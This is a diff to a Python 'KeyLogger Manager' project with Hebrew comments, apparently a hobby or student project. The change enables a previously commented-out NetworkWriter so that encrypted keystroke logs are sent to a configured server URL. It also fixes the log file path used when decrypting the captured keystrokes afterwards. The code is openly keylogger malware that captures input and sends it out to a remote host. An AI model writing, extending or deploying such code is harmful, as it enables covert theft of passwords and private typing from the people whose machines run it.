@@ -18,12 +18,17 @@ def main():
 
     encryptor = Encryptor(key=encryption_key)
 
-    # כתיבה לקובץ (ללא שרת כרגע)
+    # כתיבה לקובץ
     file_writer = FileWriter(Config.LOG_DIRECTORY)
-    # network_writer = NetworkWriter(
-    #     key=encryption_key,
-    #     server_url=Config.SERVER_URL
-    # )
+
+    print(f"Config.SERVER_URL = {Config.SERVER_URL}")
+
+
+    # כתיבה לשרת (הפעל אם יש לך Backend פעיל)
+    network_writer = NetworkWriter(
+        key=encryption_key,
+        server_url=Config.SERVER_URL
+    )
 
     # שירות לוגים
     keylogger = Keyloggerservice()
@@ -33,7 +38,7 @@ def main():
         keylogger_service=keylogger,
         encryptor=encryptor,
         file_writer=file_writer,
-        # network_writer=network_writer
+        network_writer=network_writer
     )
 
     logging.info("🚀 KeyLogger Manager התחיל לרוץ...")
@@ -49,7 +54,8 @@ def main():
 
         # ---- פענוח הקובץ אחרי העצירה ----
         try:
-            with open(Config.LOG_DIRECTORY, "r", encoding="utf-8") as f:
+            log_file = f"{Config.LOG_DIRECTORY}/log.txt"
+            with open(log_file, "r", encoding="utf-8") as f:
                 encrypted_data = f.read()
 
             decrypted_data = encryptor.decrypt(encrypted_data)
@@ -60,7 +66,7 @@ def main():
             with open("decrypted_output.txt", "w", encoding="utf-8") as f:
                 f.write(decrypted_data)
 
-            print("\nDecrypted content saved to decrypted_output.txt")
+            print("\n✅ Decrypted content saved to decrypted_output.txt")
 
         except Exception as e:
             print(f"⚠ Error decrypting file: {e}")
